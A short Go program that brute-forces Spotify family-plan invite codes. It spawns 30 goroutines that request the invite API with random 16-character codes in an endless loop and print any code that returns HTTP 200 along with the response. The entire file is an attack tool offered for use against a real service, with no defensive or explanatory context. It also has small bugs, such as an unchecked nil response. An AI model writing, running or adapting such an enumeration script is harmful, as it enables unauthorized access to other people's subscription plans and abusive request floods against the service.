package main
import (	
	"io/ioutil"
	"time"
	"fmt"
	"net/http"
	"math/rand"
)
var number = 0

var chars = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")

func code(n int) string {
        b := make([]rune, n)
        for i := range b {
                b[i] = chars[rand.Intn(len(chars))]
        }
        return string(b)
}
func check() {
	for {
		number += 1
		var link = "https://www.spotify.com/api/family/v1/family/invite/"+code(16) 
		
		resp, err := http.Get(link)
		
		if err != nil {
			fmt.Println(err)
		}
		response, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(err)
		}
		if resp.StatusCode == 200 {
			fmt.Printf("[!] Valid code!", link)
			fmt.Println(number)
			fmt.Println(string(response))
			
		} else {
			fmt.Println("[-] Invalid code.", link)
			fmt.Printf("CHECKS - ")
			fmt.Println(number)
		}
	}
	
}
func main() {
	sum := 0
	for i := 0; i < 30; i++ {
		sum += i
		go check()
	}
	for {
		time.Sleep(999 * time.Second)
	}
}
